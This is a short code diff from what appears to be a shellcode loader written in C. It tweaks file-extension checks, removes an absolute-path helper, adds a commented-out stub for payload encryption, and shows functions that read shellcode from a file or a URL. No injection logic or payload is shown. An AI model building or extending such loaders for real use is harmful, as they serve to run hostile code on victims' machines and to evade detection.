@@ -22,15 +22,20 @@ BOOL IsDll(IN LPCSTR lpPath)
 {
 	char* tmp = strrchr(lpPath, '.');
 	if (tmp != NULL)
-		return strcmp(tmp, ".dll") == 0;
+		return strncmp(tmp, ".dll", 4) == 0;
 
 	return FALSE;
 }
 
-BOOL IsAbsolutePath(IN LPCSTR lpPath)
+/* TODO: Payload Encryption
+BOOL IsEncrypted(IN LPCSTR lpPath)
 {
-	return (strncmp(lpPath, "C:\\", 3) == 0);
-}
+	char* tmp = strrchr(lpPath, '.');
+	if (tmp != NULL)
+		return strncmp(tmp, ".enc", 4) == 0;
+
+	return FALSE;
+}*/
 
 BOOL ReadShellcodeFromFile(IN LPCSTR lpPath, OUT PVOID* pShellcode, OUT SIZE_T* sShellcodeSize)
 {
@@ -126,7 +131,6 @@ BOOL ReadShellcodeFromURL(IN LPCSTR lpUrl, OUT PVOID* pShellcode, OUT SIZE_T* sS
 
 BOOL FetchShellcode(IN LPCSTR lpShellcodePath, OUT PVOID* pShellcode, OUT SIZE_T* sShellcodeSize)
 {
-
 	// Shellcode is a file on disk
 	if (FileExists(lpShellcodePath))
 	{
